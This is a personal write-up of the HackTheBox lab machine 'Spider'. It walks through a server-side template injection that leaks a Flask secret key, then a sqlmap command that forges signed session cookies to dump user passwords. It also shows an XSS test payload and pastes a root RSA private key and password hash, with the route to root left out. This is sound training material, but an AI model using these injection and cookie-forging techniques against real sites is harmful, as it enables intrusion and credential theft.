# Spider
#HTB #CTF 

IP : 10.10.10.243
OS:  Linux
Rank: Hard


## Setup 
Add IP to hosts file. 
```bash
echo "10.10.10.243 spider.htb" >> /etc/hosts
```

## Recon 

Start by scanning the box. 
Nmap 
````bash
nmap -sV -sC -p- spider.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Welcome to Zeta Furniture.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````

Lets go to the website. 
![[Pasted image 20210603093134.png]]
We see the options to register as a user, lets do that first. Once registered we see there is a admin panel, but when we click on it, it redirect us back. 
Lets look at our session token it base64 and the format look like jwt. lets go to *jwt.io* and see what we can learn. It our cart_items, uuid and some gibberish. 

After alot of fuzzing I learn the the registration page is vulnable to ssti, by sending 
*%7B%7Bconfig%7D%7D* as username and confirm username we are able to retrieve configuration information of the web application 

[ssti](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

````
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'RATELIMIT_ENABLED': True, 'RATELIMIT_DEFAULTS_PER_METHOD': False, 'RATELIMIT_SWALLOW_ERRORS': False, 'RATELIMIT_HEADERS_ENABLED': False, 'RATELIMIT_STORAGE_URL': 'memory://', 'RATELIMIT_STRATEGY': 'fixed-window', 'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset', 'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining', 'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit', 'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After', 'UPLOAD_FOLDER': 'static/uploads'}>
````

We got a key.
SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'

Lets use sqlmap combined with the key to try and dump the 
````bash
sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --delay 1 --dump
````
Out of the most important information. 
````bash
Database: shop
Table: messages
[1 entry]
+---------+---------+-----------------------------------------------------------------------------------+---------------------+
| post_id | creator | message                                                                           | timestamp           |
+---------+---------+-----------------------------------------------------------------------------------+---------------------+
| 1       | 1       | Fix the <b>/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</b> portal! | 2020-04-24 15:02:41 |
+---------+---------+-----------------------------------------------------------------------------------+---------------------+
--snip--
Database: shop
Table: users
[6 entries]
+----+--------------------------------------+------------+-----------------+
| id | uuid                                 | name       | password        |
+----+--------------------------------------+------------+-----------------+
| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |
| 2  | d0feafb8-c609-46f3-aa1c-752ed9453c53 | {{10+10}}  | Pa55w0rd        |
| 3  | f8fa7aaf-be61-4c6a-a718-2eacc711894b | test123    | test123         |
| 4  | 3902a099-494b-412a-a0f0-2578d256b58e | {{7*7}}    | test            |
| 5  | 44c5a588-64a8-4404-9b85-267037207bbf | {{config}} | test            |
| 6  | ff36fedf-5201-45e5-a7f6-4dc56302bdaa | {{user}}   | test            |
+----+--------------------------------------+------------+-----------------+
````
We also learn about a unfinished support portal 

Creds : 129f60ea-30cf-4065-afb9-6be45ad38b73 : ch1VW4sHERE7331
Let start by logging in as chiv. 
![[Pasted image 20210603102134.png]]
We get presentented by admin panel. 

The other site is from dump is the site for creating support ticket 
![[Pasted image 20210603102258.png]]

Doing some quick test on the support page, we learn that it vulnerable to XSS by using 
*<script>alert();</script>* and visit the ticker from admin panel alert get displayed. This not not really help us gain anything as it only run in the browser which is us. 


ROOT:  
  
````
-----BEGIN RSA PRIVATE KEY-----  
MIIEowIBAAKCAQEAl/dn2XpJQuIw49CVNdAgdeO5WZ47tZDYZ+7tXD8Q5tfqmyxq  
gsgQskHffuzjq8v/q4aBfm6lQSn47G8foq0gQ1DvuZkWFAATvTjliXuE7gLcItPt  
iFtbg7RQV/xaTwAmdRfRLb7x63TG6mZDRkvFvGfihWqAnkuJNqoVJclgIXLuwUvk  
4d3/Vo/MdEUb02ha7Rw9oHSYKR4pIgv4mDwxGGL+fwo6hFNCZ+YK96wMlJc3vo5Z  
EgkdKXy3RnLKvtxjpIlfmAZGu0T+RX1GlmoPDqoDWRbWU+wdbES35vqxH0uM5WUh  
vPt5ZDGiKID4Tft57udHxPiSD6YBhLT5ooHfFQIDAQABAoIBAFxB9Acg6Vc0kO/N  
krhfyUUo4j7ZBHDfJbI7aFinZPBwRtq75VHOeexud2vMDxAeQfJ1Lyp9q8/a1mdb  
sz4EkuCrQ05O9QthXJp0700+8t24WMLAHKW6qN1VW61+46iwc6iEtBZspNwIQjbN  
rKwBlmMiQnAyzzDKtNu9+Ca/kZ/cAjLpz3m1NW7X//rcDL8kBGs8RfuHqz/R4R7e  
HtCvxuXOFnyo/I+A3j1dPHoc5UH56g1W82NwTCbtCfMfeUsUOByLcg3yEypClO/M  
s7pWQ1e4m27/NmU7R/cslc03YFQxow+CIbdd59dBKTZKErdiMd49WiZSxizL7Rdt  
WBTACsUCgYEAyU9azupb71YnGQVLpdTOzoTD6ReZlbDGeqz4BD5xzbkDj7MOT5Dy  
R335NRBf7EJC0ODXNVSY+4vEXqMTx9eTxpMtsP6u0WvIYwy9C7K/wCz+WXNV0zc0  
kcSQH/Yfkd2jADkMxHXkz9THXCChOfEt7IUmNSM2VBKb1xBMkuLXQbMCgYEAwUBS  
FhRNrIB3os7qYayE+XrGVdx/KXcKva6zn20YktWYlH2HLfXcFQQdr30cPxxBSriS  
BAKYcdFXSUQDPJ1/qE21OvDLmJFu4Xs7ZdGG8o5v8JmF6TLTwi0Vi45g38DJagEl  
w42zV3vV7bsAhQsMvd3igLEoDFt34jO9nQv9KBcCgYEAk8eLVAY7AxFtljKK++ui  
/Xv9DWnjtz2UFo5Pa14j0O+Wq7C4OrSfBth1Tvz8TcW+ovPLSD0YKODLgOWaKcQZ  
mVaF3j64OsgyzHOXe7T2iq788NF4GZuXHcL8Qlo9hqj7dbhrpPUeyWrcBsd1U8G3  
AsAj8jItOb6HZHN0owefGX0CgYAICQmgu2VjZ9ARp/Lc7tR0nyNCDLII4ldC/dGg  
LmQYLuNyQSnuwktNYGdvlY8oHJ+mYLhJjGYUTXUIqdhMm+vj7p87fSmqBVoL7BjT  
Kfwnd761zVxhDuj5KPC9ZcUnaJe3XabZU7oCSDbj9KOX5Ja6ClDRswwMP31jnW0j  
64yyLwKBgBkRFxxuGkB9IMmcN19zMWA6akE0/jD6c/51IRx9lyeOmWFPqitNenWK  
teYjUjFTLgoi8MSTPAVufpdQV4128HuMbMLVpHYOVWKH/noFetpTE2uFStsNrMD8  
vEgG/fMJ9XmHVsPePviZBfrnszhP77sgCXX8Grhx9GlVMUdxeo+j  
-----END RSA PRIVATE KEY-----
````

root key : $6$ojguaxxr$tn3xDvoPP3.GyofrKM2bsdoZfGaM3u9zKHobRpD0A1bM.c7EDNno9f5JBv8bOG0R.uO98.AgGMoS9q/7NFisy/:18769:0:99999:7:::

